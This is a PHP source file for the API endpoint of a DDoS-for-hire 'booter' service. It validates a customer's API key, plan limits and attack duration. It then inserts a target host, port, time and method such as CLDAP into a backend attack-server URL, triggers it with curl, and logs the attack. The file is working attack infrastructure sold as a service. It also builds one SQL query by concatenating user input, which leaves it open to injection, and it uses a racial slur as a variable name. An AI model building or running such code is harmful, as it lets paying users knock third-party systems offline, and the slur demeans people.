<html>
<style type="text/css">
	body {
		background-color: #0b0b0b;
		color:#fff;
	}
</style>
<body>
<?php
require_once '../@/config.php';
require_once '../@/init.php';

if (!(empty($maintaince))) {
	die($maintaince);
}


    $ip = $_SERVER['REMOTE_ADDR'];

$nameofthesite = "booter";
if(isset($_GET['key']))
{
	if(!empty($_GET['key']))
	{
		// Store the key into a variable
		$key = $_GET['key'];
		
		// Fetch the user who owns the key specified
		$FetchUserSQL = $odb -> prepare("SELECT * FROM `users` WHERE `apikey` = ?");
		$FetchUserSQL -> execute(array($key));
		$FetchedUser = $FetchUserSQL -> fetch(PDO::FETCH_ASSOC);
		
		if($FetchedUser){
			
				$SQLGetApiEnabled = $odb -> prepare("SELECT `plans`.`apiaccess` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
				$SQLGetApiEnabled -> execute(array(':key' => $key));
				$apiEnabled = $SQLGetApiEnabled -> fetchColumn(0);
			if($apiEnabled == Yes){


			$host = $_GET['host'];
			$port = intval($_GET['port']);
			$time = intval($_GET['time']);
			$method = $_GET['method'];
			
			if(empty($host) || empty($port) || empty($time) || empty($method))
			{
				die("Please fill all the fields. - ".$nameofthesite." (Example: ".$siteurl."api/api.php?key=1234&host=1.2.3.4&port=80&time=30&method=CLDAP");
			}
			
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = '$host' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
	        $SQL -> execute(array());
	        $countRunningH = $SQL -> fetchColumn(0);
	        if ($countRunningH == 2) {

	            die(error("You're already booting this target."));
	        }
			
			if($host == "127.0.0.1") die("You cannot attack a local IP. - ".$nameofthesite."");
		
$SQLCHECKMethods = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = ?");
$SQLCHECKMethods -> execute(array($method));
$countMethods = $SQLCHECKMethods -> fetchColumn(0);

                if($countMethods > 0){
				$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host");
				$SQLCheckBlacklist -> execute(array(':host' => $host));
				$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
				if($countBlacklist > 0)
				{
					die("This IP Address is currently blacklisted. - , ".$nameofthesite."");
				}
				
				$checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
				$checkRunningSQL -> execute(array(':username' => $FetchedUser['username']));
				$countRunning = $checkRunningSQL -> fetchColumn(0);
								
				$SQLGetConcurrent = $odb -> prepare("SELECT `plans`.`concurrents` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
				$SQLGetConcurrent -> execute(array(':key' => $key));
				$userConcurrent = $SQLGetConcurrent -> fetchColumn(0);
				
				if($countRunning < $userConcurrent)
				{
					$SQLGetTime = $odb -> prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
					$SQLGetTime -> execute(array(':key' => $key));
					$maxTime = $SQLGetTime -> fetchColumn(0);
					if(!($time > $maxTime))
					{
							$getServer = $odb -> prepare("SELECT * FROM `vipapi` WHERE `methods` LIKE :method ORDER BY RAND()");
							$getServer -> execute(array(':method' => "%{$method}%"));
							$serverFetched = $getServer -> fetch(PDO::FETCH_ASSOC);

							$getServerName = $odb -> prepare("SELECT `name` FROM `methods` ORDER BY RAND() LIMIT 1");
							$getServerName -> execute();
							$serverName = $getServerName -> fetchColumn(0);
                                                        
						  {
                                                                    //Rotation
                                                                    $urlnigga = $serverFetched['api'];
                                                                    $arrayFind = array('[host]', '[port]', '[time]', '[method]');
                                                                    $arrayReplace = array($host, $port, $time, $method);
                                                                    for($i = 0; $i < count($arrayFind); $i++)
                                                                    $urlnigga = str_replace($arrayFind[$i], $arrayReplace[$i], $urlnigga);
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $urlnigga);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                                                                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
                                                                    curl_exec($ch);
                                                                    curl_close($ch);
                                                                    
$serverNameLog .= $serverFetched['name'] . " Api System";
                                                                    $good = 1;

                                                            }
                                                            if($good == 1)
                                                            {

    //Insert Logs
    $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler)");
    $insertLogSQL->execute(array(
        ':user' => $FetchedUser['username'],
        ':ip' => $host,
        ':port' => $port,
        ':time' => $time,
        ':method' => $method,
        ':handler' => $serverNameLog
    ));
	echo 'Your attack has been sent to '.$host.':'.$port.' for '.$time.' seconds using '.$method;
							exit();
						}
					}
					else
	{
		die("You dont have that many seconds, ".$nameofthesite."");
	}
				}
				else
				{
					die("You have reached the max concurrents for your plan. - ".$nameofthesite."");
				}
			}
			else
			{
				echo '=====Methods=====<br>';
$getMethods = $odb -> prepare("SELECT * FROM methods");
$getMethods -> execute();
while ($methodsFetched = $getMethods -> fetch(PDO::FETCH_ASSOC))
{
echo ''.$methodsFetched["name"].'<br>';
}
				echo '=====Methods=====<br>';
die("Invalid method, available methods listed above");
			}
		}
		else
		{
			die("Your API Access is Disabled!. - ".$nameofthesite."");
		}
		}
		else
		{
			die("Invalid Key Specified. - ".$nameofthesite."");
		}
	}
	else
	{
		die("No key specified. - ".$nameofthesite."");
	}
}
else
{
	die("No key specified. - ".$nameofthesite."");
}
?>
</body>